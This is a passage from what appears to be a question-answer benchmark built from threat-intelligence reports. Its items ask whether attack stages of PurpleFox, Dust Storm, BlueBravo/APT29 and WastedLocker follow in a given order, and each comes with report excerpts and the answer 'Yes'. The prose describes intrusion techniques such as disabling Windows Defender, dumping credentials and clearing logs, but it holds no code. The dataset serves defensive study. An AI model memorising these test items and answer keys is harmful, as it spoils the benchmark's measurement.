Command and Control: The new .NET backdoor, named FoxSocket, leveraged WebSockets to establish a robust and secure command-and-control (C&C) channel with its servers. The backdoor maintained an open WebSocket connection by sending keepalive messages and exchanged bidirectional messages to negotiate a session encryption key. The C&C infrastructure included several active servers and domains, with the main domain advb9fyxlf2v[.]com used for load balancing across multiple active servers.
Others: The Trend Micro Vision One platform flagged suspicious PowerShell commands that retrieved the FoxSocket backdoor. The backdoor utilized WebSocket communication for a bidirectional channel between the infected client and the server, providing a covert alternative to HTTP traffic. The backdoor's capabilities included key negotiations, machine fingerprinting, and the ability to execute various commands from the server. The Trend Micro Managed XDR service offers expert threat monitoring and analysis, enhanced by AI and global threat intelligence. All indicators of compromise (IOCs) related to this attack are documented separately.",Yes,PurpleFox Adds New Backdoor That Uses WebSockets
1643,309,309-Defense Evasion-T1070-Indicator Removal,"After ensuring persistence by modifying registry values to replace sens.dll with malware, is PurpleFox likely to copy itself to another file and restore the original sens.dll file before executing a rootkit driver to evade defense mechanisms?","Defense Evasion: PurpleFox's defense evasion tactics included the use of an MSI package that removed registry keys of old PurpleFox installations and installed a rootkit driver to hide its files, registry keys, and processes. The malware copied itself to another file, restored the original sens.dll file, and then loaded the driver to conceal its presence. Additionally, a .vbs script was executed to create a Windows firewall rule to block incoming connections on ports 135, 139, and 445.","Initial Access: In September 2021, the Trend Micro Managed XDR (MDR) team detected suspicious activity related to a PurpleFox operator. The initial access was achieved through PowerShell commands that downloaded malicious payloads from URLs hosted on compromised servers, which are part of the PurpleFox botnet. The servers, mostly located in China, served as the infrastructure for the initial foothold within the network.
Execution: The execution phase involved PowerShell commands that initiated the download of a malicious payload, which included a script targeting 64-bit systems. The script checked the Windows version and applied hotfixes for vulnerabilities it targeted, such as CVE-2020-1054, CVE-2019-0808, CVE-2019-1458, and CVE-2021-1732. It then used the PowerSploit module to reflectively load an exploit bundle binary with the target vulnerability and an MSI command as arguments. As a failover, it used the Tater module to launch the MSI command, aiming to install the MSI package as an admin without user interaction.
Persistence: The MSI package installed by PurpleFox ensured persistence by removing old PurpleFox installations from the registry and installing components of the PurpleFox backdoor into the Windows directory. It modified registry values under 'HKLM\SYSTEM\CurrentControlSet\Control\Session Manager' to allow for file rename operations upon system restart, effectively replacing sens.dll with the malware to run as the System Event Notification Service (SENS).
Command and Control: The new .NET backdoor, named FoxSocket, leveraged WebSockets to establish a robust and secure command-and-control (C&C) channel with its servers. The backdoor maintained an open WebSocket connection by sending keepalive messages and exchanged bidirectional messages to negotiate a session encryption key. The C&C infrastructure included several active servers and domains, with the main domain advb9fyxlf2v[.]com used for load balancing across multiple active servers.
Others: The Trend Micro Vision One platform flagged suspicious PowerShell commands that retrieved the FoxSocket backdoor. The backdoor utilized WebSocket communication for a bidirectional channel between the infected client and the server, providing a covert alternative to HTTP traffic. The backdoor's capabilities included key negotiations, machine fingerprinting, and the ability to execute various commands from the server. The Trend Micro Managed XDR service offers expert threat monitoring and analysis, enhanced by AI and global threat intelligence. All indicators of compromise (IOCs) related to this attack are documented separately.",Yes,PurpleFox Adds New Backdoor That Uses WebSockets
1650,31,31-Reconnaissance-T1589-Gather Victim Identity Information,"After leveraging an unpatched Internet Explorer 8 vulnerability to gain a foothold into victim networks and before deploying a second-stage implant to compromise the investment arm of a major Japanese automaker, is it likely that the attack group gathered user credentials for Yahoo and Windows Live through phishing domains?","Reconnaissance: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains. February 2015: A second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance compromised the investment arm of a major Japanese Automaker.","Initial Access: July to August 2011: Attacks leveraged an unpatched Internet Explorer 8 vulnerability to gain a foothold into victim networks. February 2014: A watering hole attack on a popular software reseller delivered an Internet Explorer zero-day to a number of unsuspecting targets.
Persistence: February 2014: The group began locating and securing alternative means of persistence on victim systems.
Credential Access: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains.
Command and Control: May 2015: Attack group adopts and customizes several Android backdoors to suit their purposes and uses a massive infrastructure compared to previous attacks. Initial backdoors are relatively simple, but continually forward all SMS messages and call information back to their C2 servers. All identified victims reside in Japan or South Korea. 2015: A number of second-stage backdoors with hardcoded proxy addresses and credentials compromise a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.
Others: March to August 2013: Attack activity greatly subsides, although several new domains that will be used later are registered. Early operations are extremely blunt, relatively unsophisticated, and readily picked up by the security industry. October 2011: Attack group attempts to take advantage of the ongoing Libyan crisis by phishing the news cycle regarding Muammar Gaddafi's death, targeting US defense targets. June 2012: Attack campaign leverages previously used flash exploit and Internet Explorer zero-day. July & October 2015: Two new waves of attacks are launched, targeting multiple Japanese companies including a Japanese subsidiary of a South Korean electric utility and a major Japanese oil and gas company. The most likely goals are reconnaissance and long-term espionage. 2016: SPEAR believes that attacks of this nature into companies involved in Japanese critical infrastructure and resources are ongoing and likely to continue to escalate in the future.",Yes,Dust_Storm_Infographic_v4
1651,31,31-Initial Access-T1189-Drive-by Compromise,"After attempting to gather user credentials through phishing domains during the reconnaissance phase, is it likely that the attack group would exploit an unpatched Internet Explorer 8 vulnerability to gain a foothold into victim networks before securing alternative means of persistence on victim systems?",Initial Access: July to August 2011: Attacks leveraged an unpatched Internet Explorer 8 vulnerability to gain a foothold into victim networks. February 2014: A watering hole attack on a popular software reseller delivered an Internet Explorer zero-day to a number of unsuspecting targets.,"Reconnaissance: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains. February 2015: A second-stage implant delivered by a variant of the S-Type backdoor shortly following its initial reconnaissance compromised the investment arm of a major Japanese Automaker.
Persistence: February 2014: The group began locating and securing alternative means of persistence on victim systems.
Credential Access: July to August 2011: The attack group attempted to gather user credentials for Yahoo, Windows Live, and other accounts through several different phishing domains.
Command and Control: May 2015: Attack group adopts and customizes several Android backdoors to suit their purposes and uses a massive infrastructure compared to previous attacks. Initial backdoors are relatively simple, but continually forward all SMS messages and call information back to their C2 servers. All identified victims reside in Japan or South Korea. 2015: A number of second-stage backdoors with hardcoded proxy addresses and credentials compromise a number of Japanese companies involved in power generation, oil and natural gas, construction, finance, and transportation.
Others: March to August 2013: Attack activity greatly subsides, although several new domains that will be used later are registered. Early operations are extremely blunt, relatively unsophisticated, and readily picked up by the security industry. October 2011: Attack group attempts to take advantage of the ongoing Libyan crisis by phishing the news cycle regarding Muammar Gaddafi's death, targeting US defense targets. June 2012: Attack campaign leverages previously used flash exploit and Internet Explorer zero-day. July & October 2015: Two new waves of attacks are launched, targeting multiple Japanese companies including a Japanese subsidiary of a South Korean electric utility and a major Japanese oil and gas company. The most likely goals are reconnaissance and long-term espionage. 2016: SPEAR believes that attacks of this nature into companies involved in Japanese critical infrastructure and resources are ongoing and likely to continue to escalate in the future.",Yes,Dust_Storm_Infographic_v4
1657,310,310-Defense Evasion-T1562-Impair Defenses,"After delivering malware to victims via spearphishing emails with malicious links and employing HTML smuggling for Initial Access, is BlueBravo likely to impair defenses by disabling or modifying tools before gathering victim system information, including usernames, computer names, and network connections?","Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1658,310,310-Discovery-T1082-System Information Discovery,"After establishing persistence by creating registry run keys to execute malware during system startup, is BlueBravo likely to gather victim system information including username, computer name, Windows version, and list of running processes?","Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1659,310,310-Discovery-T1033-System Owner/User Discovery,"After BlueBravo employs defense evasion techniques such as DLL side-loading and HTML smuggling, is it likely that their malware will gather system information like username and computer name before attempting encrypted HTTPS communication with its C2 server?","Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1660,310,310-Discovery-T1049-System Network Connections Discovery,"Is it likely that BlueBravo will employ defense evasion techniques such as DLL search order hijacking before gathering victim system information, including username, computer name, Windows version, network connections, and a list of running processes?","Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1661,310,310-Discovery-T1057-Process Discovery,"After employing various defense evasion techniques such as DLL search order hijacking and HTML smuggling, is BlueBravo likely to gather victim system information, including a list of running processes, before using HTTPS protocol encrypted with RC4 for command and control communication?","Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1662,310,310-Command and Control-T1071-Application Layer Protocol,"After BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes, is it likely to use HTTPS protocol for C2 communication, Microsoft OneDrive, and potentially DropBox for bidirectional communication?","Command and Control: BlueBravo's malware uses HTTPS protocol for C2 communication, which is encrypted using RC4 encryption and then Base64-encoded. They also use web services like Microsoft OneDrive and potentially DropBox for bidirectional communication.","Resource Development: The BlueBravo group, associated with Russian APT29 and Midnight Blizzard, has been observed using compromised infrastructure and employing known malware families. They have also periodically used third-party services for command-and-control (C2) and reused general themes for lures. BlueBravo has been known to misuse legitimate internet services (LIS) such as Trello, Firebase, and Dropbox to evade detection.
Initial Access: BlueBravo has been delivering malware through compromised and actor-controlled domains using spearphishing emails with malicious links. Victims are redirected to compromised websites that employ scripts or HTML smuggling techniques to load malware onto their computers.
Execution: BlueBravo's malware, such as GraphicalNeutrino and GraphicalProton, acts as loaders with basic C2 functionality and implements anti-analysis techniques including API unhooking, dynamically resolving APIs, string encryption, and sandbox evasion.
Persistence: BlueBravo establishes persistence by copying the contents of malicious ISO files to a directory and creating registry run keys to execute the malware during system startup.
Defense Evasion: BlueBravo employs various defense evasion techniques, including obfuscating files or information through HTML smuggling, dynamic API resolution, masquerading, and hijacking execution flow via DLL search order hijacking and side-loading. They also impair defenses by disabling or modifying tools.
Discovery: BlueBravo's malware gathers victim system information, including username, computer name, Windows version, network connections, and a list of running processes.
Others: BlueBravo's activity suggests a focus on cyber-espionage against government sector entities in Europe, likely driven by the Russian government's need for strategic data during the war in Ukraine. The group's tactics, techniques, and procedures (TTPs) are adaptive, with recent approaches including legitimate website compromise for malware delivery and the use of PHP code for delivery. Defenders are advised to detect, block, and hunt for indicators and behaviors associated with BlueBravo.",Yes,APT29 Adapts to Target Diplomatic Entities with GraphicalProton Malware
1665,311,311-Reconnaissance-T1589-Gather Victim Identity Information,Is it likely that the attackers used the SocGholish framework to compromise legitimate websites and deliver malicious JavaScript disguised as a browser update as part of Initial Access after targeting U.S. organizations to gather victim identity information during the Reconnaissance phase?,"Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.","Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.
Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.
Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
1669,311,311-Credential Access-T1070-Indicator Removal on Host,"After profiling the computer using commands like whoami, net user, and net group during the discovery phase, is it likely that Cobalt Strike will be used to empty log files to aid in concealing the attackers' activities before employing lateral movement through commands and process injection on remote computers?","Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.","Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.
Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.
Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
1673,311,311-Discovery-T1087-Account Discovery,"After initially compromising systems using the SocGholish framework disguised as a browser update, is it likely that the attackers will execute the Cobalt Strike Beacon payload using a .NET injector before using tools such as whoami, net user, and net group to perform account discovery?","Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.","Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.
Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.
Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
1677,311,311-Impact-T1486-Data Encrypted for Impact,"After the WastedLocker ransomware is deployed using PsExec to stop services and disable Windows Defender during the Defense Evasion phase, is it likely that the ransomware will encrypt computers and servers, causing significant disruption and demanding a multimillion-dollar ransom in the Impact phase?","Impact: The end goal of the WastedLocker attacks was to cripple the victim's IT infrastructure by encrypting computers and servers, leading to significant disruption and demanding a multimillion-dollar ransom.","Reconnaissance: The CTI report by Symantec, a division of Broadcom, identified a series of attacks against U.S. organizations, aiming to deploy WastedLocker ransomware. The attackers, linked to the group 'Evil Corp', used a malicious JavaScript-based framework called SocGholish, found on over 150 compromised websites, to masquerade as a software update and initiate the attack.
Initial Access: The initial compromise involved the SocGholish framework, delivered via compromised legitimate websites. Victims received a zipped file containing malicious JavaScript disguised as a browser update. This led to the execution of a second JavaScript file by wscript.exe, profiling the computer and downloading additional discovery-related PowerShell scripts.
Execution: The attackers deployed Cobalt Strike using PowerShell to download and execute a loader, which contained a .NET injector taken from an open-source project called Donut. This was used to execute the Cobalt Strike Beacon payload, capable of command execution, process injection, privilege escalation, and file upload/download.
Privilege Escalation: Privilege escalation was achieved using a publicly documented technique involving the Software Licensing User Interface tool (slui.exe). The attackers also used the Windows Management Instrumentation Command Line Utility (wmic.exe) to execute commands on remote computers.
Defense Evasion: To deploy the ransomware, the attackers used PsExec to launch a command line tool for managing Windows Defender, disabling scanning, removing definitions, and in some cases, disabling real-time monitoring. They also used PsExec to stop services across the organization before launching the WastedLocker ransomware.
Credential Access: Cobalt Strike was used for credential dumping using ProcDump and to empty log files, aiding in the concealment of the attackers' activities.
Discovery: The discovery phase involved profiling the computer using commands like whoami, net user, and net group. The attackers also used the Get-NetComputer command from PowerView, renamed to a random name, to search for computer objects in the Active Directory database.
Lateral Movement: The attackers used Cobalt Strike Beacon for lateral movement, executing commands and injecting processes on remote computers.
Command and Control: The injected Cobalt Strike Beacon payload communicated with a command and control (C&C) domain, which was publicly reported as part of the WastedLocker attack infrastructure.
Others: Symantec's Targeted Attack Cloud Analytics, using advanced machine learning, proactively detected the attacks. The Threat Hunter team verified the activity, which corresponded to the early stages of WastedLocker attacks. This discovery helped identify additional targeted organizations and strengthen protection against the attack. Symantec has alerted at least 31 customer organizations to the threat, with the majority being major U.S. corporations, including 11 listed companies and eight Fortune 500 companies. The attackers demonstrated skill and experience, capable of penetrating well-protected corporations, stealing credentials, and moving across networks with ease. Symantec has implemented file-based protection and intrusion prevention measures to protect against WastedLocker and associated activities. Indicators of Compromise (IoCs) including domains and IP addresses linked to the attacks have been reported to the relevant registrar, with assistance from Namecheap in suspending some domains. The Critical Attack Discovery and Intelligence team within Symantec is dedicated to investigating targeted attacks, enhancing protection in Symantec products, and providing analysis to help customers respond to attacks.",Yes,WastedLocker_ Symantec Identifies Wave of Attacks Against U.S. Organizations _ Symantec Blogs
